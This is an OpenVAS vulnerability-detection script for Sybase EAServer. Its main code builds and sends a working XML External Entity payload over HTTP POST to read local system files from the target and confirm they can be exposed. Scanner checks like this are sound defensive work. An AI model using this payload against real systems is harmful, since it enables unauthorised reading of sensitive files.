###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sybase_easerver_61358.nasl 11 2013-10-27 10:12:02Z jan $
#
# Sybase EAServer Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploits will allow attackers to download and upload
arbitrary files on the affected computer, obtain potentially sensitive
information and execute arbitrary commands with the privileges of the
user running the affected application.
Impact Level: System/Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103752";

tag_insight = "1. A directory-traversal vulnerability
2. An XML External Entity injection
3. A command execution vulnerability";


tag_affected = "Sybase EAServer 6.3.1 and prior are vulnerable.";
tag_summary = "Sybase EAServer is prone to multiple security vulnerabilities.";
tag_solution = "Updates are available.";
tag_vuldetect = "Send a crafted HTTP XML POST request and check the response.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(61358);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Sybase EAServer Multiple Security Vulnerabilities");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61358");
 script_xref(name:"URL", value:"http://www.sybase.com/products/modelingdevelopment/easerver");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-08-08 13:44:48 +0200 (Thu, 08 Aug 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("Server: Jetty(EAServer/" >!< banner)exit(0);

host = get_host_name();
files = traversal_files();

foreach file(keys(files)) {

  xml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "file:///' + files[file]  + '">]>
  <openvas>
  <dt>
  <stringValue>&xxe;</stringValue>
  <booleanValue>0</booleanValue>
  </dt>
  </openvas>';

  len = strlen(xml);

  req = 'POST /rest/public/xml-1.0/testDataTypes HTTP/1.1\r\n' + 
        'Host: ' + host + '\r\n' + 
        'Content-Type: text/xml\r\n' + 
        'Content-Length: ' + len  + '\r\n' + 
        '\r\n' + xml;

  result = http_send_recv(port:port, data:req, bodyonly:TRUE);

  if("<testDataTypesResponse>" >!<result)continue;

  cont = split(result, sep:"<stringValue>", keep:FALSE); 
  if(isnull(cont[1]))continue;

  if(ereg(pattern:file, string:cont[1])) {
    security_hole(port:port);
    exit(0);
  }

}

exit(0);
